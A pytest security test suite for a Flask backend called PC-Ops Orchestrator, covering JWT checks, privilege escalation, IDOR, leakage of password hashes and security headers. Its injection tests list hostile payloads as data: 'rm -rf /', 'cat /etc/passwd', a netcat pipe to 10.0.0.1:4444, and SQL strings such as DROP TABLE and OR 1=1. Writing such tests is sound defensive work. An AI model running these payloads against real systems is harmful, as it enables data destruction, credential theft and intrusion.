"""Security-focused tests for PC-Ops Orchestrator Flask backend.

Covers:
  Item 151 - JWT authentication (valid / invalid / expired token)
  Item 158 - Privilege escalation (viewer cannot reach admin APIs)
  Item 159 - IDOR (cross-user resource access)
  Item 160 - Command injection characters in input fields
  Item 166 - Sensitive data leakage (password_hash must not appear in responses)
  Item 170 - Security response headers on /health and /api/* endpoints
  Item 141 - SQL injection mitigation in username field
"""

import json
import os
import sys
import uuid
from datetime import datetime, timedelta, timezone

import jwt
import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app import create_app
from auth import hash_password
from extensions import db
from models import User

app = create_app("testing")
client = app.test_client()

_ADMIN_USERNAME = "sec_admin"
_ADMIN_PASSWORD = "sec-admin-pass-1"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _json_request(method, path, token=None, data=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = json.dumps(data) if data is not None else None
    return client.open(path, method=method, headers=headers, data=body)


def _admin_token():
    r = _json_request(
        "POST",
        "/api/auth/login",
        data={"username": _ADMIN_USERNAME, "password": _ADMIN_PASSWORD},
    )
    assert r.status_code == 200, f"admin login failed: {r.status_code} {r.data}"
    return json.loads(r.data)["token"]


def _create_user(admin_token, username, password, role):
    r = _json_request(
        "POST",
        "/api/auth/users",
        token=admin_token,
        data={"username": username, "password": password, "role": role},
    )
    assert r.status_code == 201, f"create user failed: {r.status_code} {r.data}"
    return json.loads(r.data)["user"]["id"]


def _delete_user(admin_token, user_id):
    _json_request("DELETE", f"/api/auth/users/{user_id}", token=admin_token)


# ---------------------------------------------------------------------------
# Fixture: DB + admin user
# ---------------------------------------------------------------------------


@pytest.fixture(scope="module", autouse=True)
def setup_db():
    with app.app_context():
        db.create_all()
        if not User.query.filter_by(username=_ADMIN_USERNAME).first():
            admin = User(
                username=_ADMIN_USERNAME,
                password_hash=hash_password(_ADMIN_PASSWORD),
                role="admin",
            )
            db.session.add(admin)
            db.session.commit()
    yield
    with app.app_context():
        u = User.query.filter_by(username=_ADMIN_USERNAME).first()
        if u:
            db.session.delete(u)
        db.session.commit()


# ---------------------------------------------------------------------------
# Item 151 - JWT authentication
# ---------------------------------------------------------------------------


class TestJwtAuthentication:
    """Item 151: verify that JWT acceptance/rejection works correctly."""

    def test_valid_token_accepted(self):
        """A freshly issued token must grant access to protected endpoints."""
        token = _admin_token()
        r = _json_request("GET", "/api/auth/me", token=token)
        assert r.status_code == 200, f"valid token rejected: {r.status_code} {r.data}"
        data = json.loads(r.data)
        assert data["user"]["username"] == _ADMIN_USERNAME
        print("  [PASS] 151: valid token accepted")

    def test_missing_token_returns_401(self):
        """Omitting the Authorization header must return 401."""
        r = _json_request("GET", "/api/auth/me")
        assert r.status_code == 401, f"expected 401, got {r.status_code}"
        print("  [PASS] 151: missing token returns 401")

    def test_invalid_token_returns_401(self):
        """A tampered/garbage token must return 401."""
        r = _json_request("GET", "/api/auth/me", token="this.is.not.valid")
        assert r.status_code == 401, f"expected 401, got {r.status_code}"
        print("  [PASS] 151: invalid token returns 401")

    def test_expired_token_returns_401(self):
        """A token whose exp is in the past must be rejected with 401."""
        with app.app_context():
            secret = app.config["JWT_SECRET_KEY"]

        payload = {
            "sub": "9999",
            "username": "ghost",
            "role": "admin",
            "iat": datetime.now(timezone.utc) - timedelta(hours=10),
            "exp": datetime.now(timezone.utc) - timedelta(hours=2),
        }
        expired_token = jwt.encode(payload, secret, algorithm="HS256")
        r = _json_request("GET", "/api/auth/me", token=expired_token)
        assert r.status_code == 401, (
            f"expected 401 for expired token, got {r.status_code}"
        )
        print("  [PASS] 151: expired token returns 401")

    def test_wrong_signature_returns_401(self):
        """A token signed with a different secret must be rejected."""
        payload = {
            "sub": "1",
            "username": _ADMIN_USERNAME,
            "role": "admin",
            "iat": datetime.now(timezone.utc),
            "exp": datetime.now(timezone.utc) + timedelta(hours=8),
        }
        bad_token = jwt.encode(payload, "totally-wrong-secret", algorithm="HS256")
        r = _json_request("GET", "/api/auth/me", token=bad_token)
        assert r.status_code == 401, (
            f"expected 401 for wrong-signature token, got {r.status_code}"
        )
        print("  [PASS] 151: wrong-signature token returns 401")


# ---------------------------------------------------------------------------
# Item 158 - Privilege escalation
# ---------------------------------------------------------------------------


class TestPrivilegeEscalation:
    """Item 158: viewer must not be able to call admin-only endpoints."""

    def test_viewer_cannot_list_users(self, setup_db):
        suffix = uuid.uuid4().hex[:8]
        admin_token = _admin_token()
        viewer_id = _create_user(
            admin_token, f"sec_viewer_{suffix}", "Viewer-Pass99!", "viewer"
        )
        try:
            r_login = _json_request(
                "POST",
                "/api/auth/login",
                data={"username": f"sec_viewer_{suffix}", "password": "Viewer-Pass99!"},
            )
            assert r_login.status_code == 200
            viewer_token = json.loads(r_login.data)["token"]

            r = _json_request("GET", "/api/auth/users", token=viewer_token)
            assert r.status_code == 403, (
                f"viewer should be forbidden from user list, got {r.status_code}"
            )
            print("  [PASS] 158: viewer cannot list users (403)")
        finally:
            _delete_user(admin_token, viewer_id)

    def test_viewer_cannot_create_user(self, setup_db):
        suffix = uuid.uuid4().hex[:8]
        admin_token = _admin_token()
        viewer_id = _create_user(
            admin_token, f"sec_viewer2_{suffix}", "Viewer-Pass99!", "viewer"
        )
        try:
            r_login = _json_request(
                "POST",
                "/api/auth/login",
                data={
                    "username": f"sec_viewer2_{suffix}",
                    "password": "Viewer-Pass99!",
                },
            )
            viewer_token = json.loads(r_login.data)["token"]

            r = _json_request(
                "POST",
                "/api/auth/users",
                token=viewer_token,
                data={
                    "username": f"hacker_{suffix}",
                    "password": "Hacker-Pass1!",
                    "role": "admin",
                },
            )
            assert r.status_code == 403, (
                f"viewer should be forbidden from creating users, got {r.status_code}"
            )
            print("  [PASS] 158: viewer cannot create user (403)")
        finally:
            _delete_user(admin_token, viewer_id)

    def test_viewer_cannot_delete_task(self, setup_db):
        """viewer must not be able to delete tasks (admin-only operation)."""
        suffix = uuid.uuid4().hex[:8]
        admin_token = _admin_token()
        viewer_id = _create_user(
            admin_token, f"sec_viewer3_{suffix}", "Viewer-Pass99!", "viewer"
        )
        try:
            r_login = _json_request(
                "POST",
                "/api/auth/login",
                data={
                    "username": f"sec_viewer3_{suffix}",
                    "password": "Viewer-Pass99!",
                },
            )
            viewer_token = json.loads(r_login.data)["token"]

            # Attempt to delete task id=1 (may or may not exist; either 403 or 404 is
            # acceptable, but never 200 or 204).
            r = _json_request("DELETE", "/api/tasks/1", token=viewer_token)
            assert r.status_code in (403, 404), (
                f"viewer DELETE /api/tasks/1 expected 403/404, got {r.status_code}"
            )
            print("  [PASS] 158: viewer cannot delete task (403/404)")
        finally:
            _delete_user(admin_token, viewer_id)


# ---------------------------------------------------------------------------
# Item 159 - IDOR
# ---------------------------------------------------------------------------


class TestIdor:
    """Item 159: users must not access resources belonging to other users."""

    def test_operator_cannot_delete_other_users_task(self, setup_db):
        """operator A creates a task; operator B must not be able to delete it.

        Task deletion is admin-only, so any non-admin attempt must be 403.
        This also covers the IDOR vector where an operator tries to manipulate
        a resource owned by someone else.
        """
        suffix = uuid.uuid4().hex[:8]
        admin_token = _admin_token()
        op_a_id = _create_user(
            admin_token, f"op_a_{suffix}", "Operator-Pass9!", "operator"
        )
        op_b_id = _create_user(
            admin_token, f"op_b_{suffix}", "Operator-Pass9!", "operator"
        )
        try:
            r_a = _json_request(
                "POST",
                "/api/auth/login",
                data={"username": f"op_a_{suffix}", "password": "Operator-Pass9!"},
            )
            token_a = json.loads(r_a.data)["token"]

            r_b = _json_request(
                "POST",
                "/api/auth/login",
                data={"username": f"op_b_{suffix}", "password": "Operator-Pass9!"},
            )
            token_b = json.loads(r_b.data)["token"]

            # op_a creates a task
            r_task = _json_request(
                "POST",
                "/api/tasks",
                token=token_a,
                data={"task_type": "cleanup"},
            )
            assert r_task.status_code == 201
            task_id = json.loads(r_task.data)["task"]["id"]

            # op_b tries to delete op_a's task — must be 403 (not admin)
            r_del = _json_request("DELETE", f"/api/tasks/{task_id}", token=token_b)
            assert r_del.status_code == 403, (
                f"operator B should not be able to delete operator A's task, "
                f"got {r_del.status_code}"
            )
            print("  [PASS] 159: operator B cannot delete operator A's task (403)")

            # Cleanup: admin deletes the task
            _json_request("DELETE", f"/api/tasks/{task_id}", token=admin_token)
        finally:
            _delete_user(admin_token, op_a_id)
            _delete_user(admin_token, op_b_id)

    def test_viewer_cannot_access_other_user_detail(self, setup_db):
        """viewer must not be able to read user account details via /api/auth/users."""
        suffix = uuid.uuid4().hex[:8]
        admin_token = _admin_token()
        viewer_id = _create_user(
            admin_token, f"sec_viewer4_{suffix}", "Viewer-Pass99!", "viewer"
        )
        try:
            r_login = _json_request(
                "POST",
                "/api/auth/login",
                data={
                    "username": f"sec_viewer4_{suffix}",
                    "password": "Viewer-Pass99!",
                },
            )
            viewer_token = json.loads(r_login.data)["token"]

            # Attempt to read admin's user details via the admin-only user list
            r = _json_request("GET", "/api/auth/users", token=viewer_token)
            assert r.status_code == 403, (
                f"viewer should not access user list (IDOR), got {r.status_code}"
            )
            print("  [PASS] 159: viewer cannot access user list (IDOR guard, 403)")
        finally:
            _delete_user(admin_token, viewer_id)


# ---------------------------------------------------------------------------
# Item 160 - Command injection
# ---------------------------------------------------------------------------


class TestCommandInjection:
    """Item 160: shell-injection metacharacters in input fields must be handled safely."""

    _INJECTION_PAYLOADS = [
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc 10.0.0.1 4444",
        "test`whoami`",
        "$(id)",
        "test\necho injected",
    ]

    def test_task_command_injection_rejected_or_stored_safely(self):
        """Injection strings in the 'command' field must be rejected (400) or stored
        verbatim without execution.  The API currently validates task_type and command
        length; injection payloads exceeding 512 chars are rejected.  Short payloads
        must result in either 400 or 201 (stored as plain text, not executed).
        The test ensures no 500 is returned (i.e., no unhandled shell execution).
        """
        token = _admin_token()
        for payload in self._INJECTION_PAYLOADS:
            r = _json_request(
                "POST",
                "/api/tasks",
                token=token,
                data={"task_type": "custom", "command": payload},
            )
            # Acceptable outcomes: 400 (rejected) or 201 (stored safely as text).
            # 500 would indicate an unhandled exception that may hint at execution.
            assert r.status_code in (201, 400), (
                f"injection payload {payload!r} caused unexpected "
                f"status {r.status_code}: {r.data}"
            )
        print("  [PASS] 160: command injection payloads return 201/400, never 500")

    def test_username_injection_in_login(self):
        """SQL/shell metacharacters in username must not cause a 500."""
        for payload in self._INJECTION_PAYLOADS:
            r = _json_request(
                "POST",
                "/api/auth/login",
                data={"username": payload, "password": "irrelevant"},
            )
            assert r.status_code in (400, 401), (
                f"login with injection payload {payload!r} returned "
                f"unexpected status {r.status_code}"
            )
        print("  [PASS] 160: username injection payloads in /login return 400/401")

    def test_pc_search_injection_does_not_crash(self):
        """Shell/SQL metacharacters in the search query parameter must not cause a 500."""
        token = _admin_token()
        payloads = [
            "'; DROP TABLE pcs;--",
            '" OR "1"="1',
            "%27 OR 1=1--",
            "PC'; SELECT sleep(5)--",
        ]
        for payload in payloads:
            r = _json_request("GET", f"/api/pcs?search={payload}", token=token)
            assert r.status_code in (200, 400), (
                f"search with payload {payload!r} returned unexpected "
                f"status {r.status_code}: {r.data}"
            )
        print("  [PASS] 160: search injection payloads return 200/400, never 500")


# ---------------------------------------------------------------------------
# Item 166 - Sensitive data leakage
# ---------------------------------------------------------------------------


class TestSensitiveDataLeakage:
    """Item 166: password_hash and other secrets must never appear in API responses."""

    def test_login_response_does_not_expose_password_hash(self):
        """The /api/auth/login response must not include password_hash."""
        r = _json_request(
            "POST",
            "/api/auth/login",
            data={"username": _ADMIN_USERNAME, "password": _ADMIN_PASSWORD},
        )
        assert r.status_code == 200
        raw = r.data.decode("utf-8")
        assert "password_hash" not in raw, (
            "login response must not contain password_hash"
        )
        assert "pbkdf2" not in raw.lower(), (
            "login response must not contain raw pbkdf2 hash"
        )
        print("  [PASS] 166: login response does not expose password_hash")

    def test_user_list_does_not_expose_password_hash(self):
        """GET /api/auth/users must not include password_hash in any user object."""
        token = _admin_token()
        r = _json_request("GET", "/api/auth/users", token=token)
        assert r.status_code == 200
        raw = r.data.decode("utf-8")
        assert "password_hash" not in raw, "user list must not contain password_hash"
        print("  [PASS] 166: user list does not expose password_hash")

    def test_me_endpoint_does_not_expose_password_hash(self):
        """GET /api/auth/me must not include password_hash."""
        token = _admin_token()
        r = _json_request("GET", "/api/auth/me", token=token)
        assert r.status_code == 200
        raw = r.data.decode("utf-8")
        assert "password_hash" not in raw, "/api/auth/me must not contain password_hash"
        print("  [PASS] 166: /api/auth/me does not expose password_hash")

    def test_error_response_does_not_leak_stack_trace(self):
        """A 404 response must not include Python traceback details."""
        r = client.get("/api/nonexistent-endpoint-zzz")
        raw = r.data.decode("utf-8")
        assert "Traceback" not in raw, (
            "error response must not contain Python traceback"
        )
        assert "File " not in raw or r.status_code != 500, (
            "500 response must not expose stack traces"
        )
        print("  [PASS] 166: error response does not leak traceback")


# ---------------------------------------------------------------------------
# Item 170 - Security response headers
# ---------------------------------------------------------------------------


class TestSecurityHeaders:
    """Item 170: important HTTP security headers must be present."""

    # Headers that a secure API should set.  The app may not implement all of
    # them yet; missing ones are reported individually so we can track progress.
    _DESIRED_HEADERS = {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": None,  # any non-empty value is acceptable
        "Content-Security-Policy": None,
    }

    def _check_headers(self, path, token=None):
        headers = {}
        if token:
            headers["Authorization"] = f"Bearer {token}"
        r = client.get(path, headers=headers)
        return r

    def test_health_endpoint_responds(self):
        """/health must return 200; headers are checked separately."""
        r = self._check_headers("/health")
        assert r.status_code == 200, f"/health returned {r.status_code}"
        print("  [PASS] 170: /health returns 200")

    def test_api_endpoint_responds(self):
        """/api/dashboard/stats must return 200 with a valid token."""
        token = _admin_token()
        r = self._check_headers("/api/dashboard/stats", token=token)
        assert r.status_code == 200, f"/api/dashboard/stats returned {r.status_code}"
        print("  [PASS] 170: /api/dashboard/stats returns 200")

    def test_cors_header_present_on_api(self):
        """API responses should include CORS-related headers (Access-Control-*)."""
        token = _admin_token()
        # Flask-Cors only emits Access-Control-* when an Origin header is sent.
        headers = {
            "Authorization": f"Bearer {token}",
            "Origin": "http://localhost",
        }
        r = client.get("/api/dashboard/stats", headers=headers)
        cors_present = any(
            k.lower().startswith("access-control") for k in r.headers.keys()
        )
        assert cors_present, (
            "No Access-Control-* header found on /api/dashboard/stats with "
            "Origin: http://localhost. Flask-Cors may be misconfigured."
        )
        print("  [PASS] 170: CORS header present on API response")

    def test_cors_preflight_allowed_origin(self):
        """Item 124: OPTIONS preflight from an allowed origin must succeed.

        Required for Flask-Cors 6.x compatibility (preflight matching is
        stricter than 5.x).
        """
        r = client.open(
            "/api/auth/login",
            method="OPTIONS",
            headers={
                "Origin": "http://localhost",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type",
            },
        )
        # Preflight should succeed (200 or 204)
        assert r.status_code in (200, 204), (
            f"preflight returned {r.status_code} for allowed origin"
        )
        # ACAO header must echo the allowed origin or be '*'
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        assert acao in ("http://localhost", "*"), (
            f"unexpected Access-Control-Allow-Origin: {acao!r}"
        )
        print(f"  [PASS] 124: CORS preflight allows http://localhost (ACAO={acao})")

    def test_content_type_header_on_json_api(self):
        """JSON API responses must have Content-Type: application/json."""
        token = _admin_token()
        r = self._check_headers("/api/dashboard/stats", token=token)
        ct = r.headers.get("Content-Type", "")
        assert "application/json" in ct, (
            f"expected application/json Content-Type, got {ct!r}"
        )
        print("  [PASS] 170: JSON API response has correct Content-Type")

    def test_x_content_type_options_present(self):
        """X-Content-Type-Options: nosniff should be set to prevent MIME-sniffing.

        This header is not yet enforced by the current implementation; the test
        documents the gap so it can be tracked as a future hardening item.
        """
        token = _admin_token()
        r = self._check_headers("/api/dashboard/stats", token=token)
        val = r.headers.get("X-Content-Type-Options", "")
        if not val:
            pytest.xfail(
                "X-Content-Type-Options header is missing — "
                "add flask-talisman or set the header manually (future hardening)"
            )
        assert val.lower() == "nosniff"
        print("  [PASS] 170: X-Content-Type-Options: nosniff present")

    def test_x_frame_options_present(self):
        """X-Frame-Options should be set to prevent clickjacking.

        Marked xfail until the header is added.
        """
        r = client.get("/health")
        val = r.headers.get("X-Frame-Options", "")
        if not val:
            pytest.xfail(
                "X-Frame-Options header is missing — "
                "add flask-talisman or set the header manually (future hardening)"
            )
        assert val.upper() in ("DENY", "SAMEORIGIN")
        print("  [PASS] 170: X-Frame-Options present")

    def test_referrer_policy_present(self):
        """Referrer-Policy should restrict cross-origin referrer leakage."""
        r = client.get("/health")
        val = r.headers.get("Referrer-Policy", "")
        assert val, "Referrer-Policy header missing"
        assert "strict-origin" in val or "no-referrer" in val, (
            f"weak Referrer-Policy: {val!r}"
        )
        print(f"  [PASS] 170: Referrer-Policy: {val}")

    def test_x_xss_protection_present(self):
        """X-XSS-Protection should be set for legacy browsers."""
        r = client.get("/health")
        val = r.headers.get("X-XSS-Protection", "")
        assert val, "X-XSS-Protection header missing"
        print(f"  [PASS] 170: X-XSS-Protection: {val}")

    def test_content_security_policy_present(self):
        """CSP must be present and restrict default-src."""
        r = client.get("/health")
        val = r.headers.get("Content-Security-Policy", "")
        assert val, "Content-Security-Policy header missing"
        assert "default-src" in val, f"CSP without default-src: {val!r}"
        # Chart.js CDN must remain allowed for the dashboard to render.
        assert "cdn.jsdelivr.net" in val, (
            f"CSP must allow Chart.js from cdn.jsdelivr.net: {val!r}"
        )
        print("  [PASS] 170: Content-Security-Policy present and well-formed")

    def test_csp_script_src_uses_nonce_not_unsafe_inline(self):
        """CSP script-src must use nonce and must NOT contain 'unsafe-inline' (Phase 2).

        All inline event handlers (onclick/oninput/onchange/onsubmit) have been
        migrated to addEventListener in external JS files, so 'unsafe-inline' can
        and must be absent from script-src.
        """
        r = client.get("/health")
        val = r.headers.get("Content-Security-Policy", "")
        script_src = ""
        for directive in val.split(";"):
            directive = directive.strip()
            if directive.startswith("script-src"):
                script_src = directive
                break
        assert script_src, f"No script-src directive in CSP: {val!r}"
        assert "nonce-" in script_src, (
            f"CSP script-src must contain nonce-<token>: {script_src!r}"
        )
        assert "'unsafe-inline'" not in script_src, (
            f"CSP script-src must NOT contain 'unsafe-inline' (Phase 2 complete): {script_src!r}"
        )
        print("  [PASS] CSP script-src uses nonce, no 'unsafe-inline' (Phase 2 CSP hardening)")

    def test_permissions_policy_present(self):
        """Permissions-Policy should disable unused powerful features."""
        r = client.get("/health")
        val = r.headers.get("Permissions-Policy", "")
        assert val, "Permissions-Policy header missing"
        # Geolocation/camera/microphone should be disabled by default.
        assert "geolocation=()" in val, (
            f"Permissions-Policy must disable geolocation: {val!r}"
        )
        print(f"  [PASS] 170: Permissions-Policy: {val}")

    def test_hsts_present_in_production_only(self):
        """HSTS should only be set when running with FLASK_CONFIG=production.

        For the default 'testing' app (HTTP), HSTS should be absent so we don't
        teach browsers to remember an http://localhost upgrade.
        """
        r = client.get("/health")
        # The default test app uses 'testing' config, so HSTS must be absent.
        val = r.headers.get("Strict-Transport-Security", "")
        assert not val, (
            f"HSTS should NOT be set under non-production config, got {val!r}"
        )
        print("  [PASS] 170: HSTS correctly absent under non-production config")


# ---------------------------------------------------------------------------
# Item 141 - SQL injection
# ---------------------------------------------------------------------------


class TestSqlInjection:
    """Item 141: SQL injection in username and other string fields must be mitigated."""

    _SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT 1,2,3--",
        '"; DROP TABLE users;--',
        "' OR 'x'='x",
    ]

    def test_login_sql_injection_does_not_bypass_auth(self):
        """SQL injection in the username field must not grant access."""
        for payload in self._SQL_PAYLOADS:
            r = _json_request(
                "POST",
                "/api/auth/login",
                data={"username": payload, "password": "any_password"},
            )
            # Must not return 200 (successful login would indicate bypass).
            assert r.status_code != 200, (
                f"SQL injection payload {payload!r} resulted in successful login "
                f"(status 200) — authentication bypass!"
            )
            # Acceptable: 400 (validation error) or 401 (wrong credentials).
            assert r.status_code in (400, 401), (
                f"SQL injection payload {payload!r} caused unexpected "
                f"status {r.status_code}: {r.data}"
            )
        print("  [PASS] 141: SQL injection payloads in /login do not bypass auth")

    def test_login_sql_injection_does_not_cause_500(self):
        """SQL injection must not raise an unhandled exception (500)."""
        for payload in self._SQL_PAYLOADS:
            r = _json_request(
                "POST",
                "/api/auth/login",
                data={"username": payload, "password": "any_password"},
            )
            assert r.status_code != 500, (
                f"SQL injection payload {payload!r} caused a 500 error — "
                f"possible unhandled exception: {r.data}"
            )
        print("  [PASS] 141: SQL injection payloads do not cause 500")

    def test_pc_list_search_sql_injection(self):
        """SQL injection in the search query parameter must be handled safely."""
        token = _admin_token()
        for payload in self._SQL_PAYLOADS:
            r = _json_request("GET", f"/api/pcs?search={payload}", token=token)
            assert r.status_code != 500, (
                f"SQL injection in search param caused 500: {r.data}"
            )
            # 200 with empty results or 400 are both acceptable
            assert r.status_code in (200, 400), (
                f"Unexpected status {r.status_code} for search payload {payload!r}"
            )
        print("  [PASS] 141: SQL injection in search param returns 200/400, not 500")

    def test_username_creation_sql_injection(self):
        """SQL injection in the username field of user creation must be rejected or
        stored as plain text without causing a 500.
        """
        token = _admin_token()
        for payload in self._SQL_PAYLOADS:
            r = _json_request(
                "POST",
                "/api/auth/users",
                token=token,
                data={
                    "username": payload,
                    "password": "safe-pass-123",
                    "role": "viewer",
                },
            )
            assert r.status_code != 500, (
                f"SQL injection in username creation caused 500: {r.data}"
            )
        print("  [PASS] 141: SQL injection in username creation does not cause 500")
